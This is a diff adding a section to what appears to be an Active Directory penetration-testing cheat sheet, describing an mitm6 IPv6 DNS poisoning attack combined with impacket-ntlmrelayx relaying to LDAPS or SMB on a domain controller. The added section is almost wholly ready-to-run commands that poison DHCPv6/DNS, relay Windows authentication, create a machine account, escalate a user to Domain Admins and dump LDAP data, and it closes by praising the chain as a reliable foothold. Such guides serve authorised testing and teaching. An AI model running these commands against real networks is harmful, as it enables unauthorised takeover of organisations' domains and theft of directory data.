@@ -115,6 +115,36 @@ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/h
 
 ---
 
+## mitm6 — IPv6 DNS Poisoning + LDAP Relay
+
+Most Windows machines have IPv6 enabled and prefer it. mitm6 hijacks DHCPv6 and DNS to become the victim's DNS server, then relays authentication attempts to LDAP on the DC — creating a new privileged user automatically.
+
+```bash
+# Requirements: IPv6 enabled on LAN (almost always true), no LDAP signing enforced
+
+# Step 1: start mitm6 — poisons IPv6 for the target domain
+sudo mitm6 -d $DOMAIN
+
+# Step 2: start ntlmrelayx targeting LDAPS on DC
+# Auto-creates a machine account + adds it to Domain Admins (if relay succeeds with domain user)
+impacket-ntlmrelayx -6 -t ldaps://$DC_IP \
+  -wh fakewpad.$DOMAIN \
+  -l /tmp/loot \
+  --add-computer FAKE$ \
+  --escalate-user attacker   # if you already have a domain user
+
+# Or let it auto-create a user:
+impacket-ntlmrelayx -6 -t ldaps://$DC_IP -wh fakewpad.$DOMAIN -l /tmp/loot
+
+# Waits for Windows client authentication (e.g. system reboot, network browse)
+# ntlmrelayx dumps LDAP data to /tmp/loot/ and reports any created accounts
+
+# If LDAPS relay fails (signing enforced), fall back to SMB relay
+impacket-ntlmrelayx -6 -t smb://$IP -smb2support -wh fakewpad.$DOMAIN
+```
+
+> mitm6 + ntlmrelayx is one of the most reliable unauthenticated → foothold vectors on internal networks with default configurations.
+
 ## NTLM Relay Attack
 
 Works when SMB signing is disabled (common on workstations, less common on DCs).
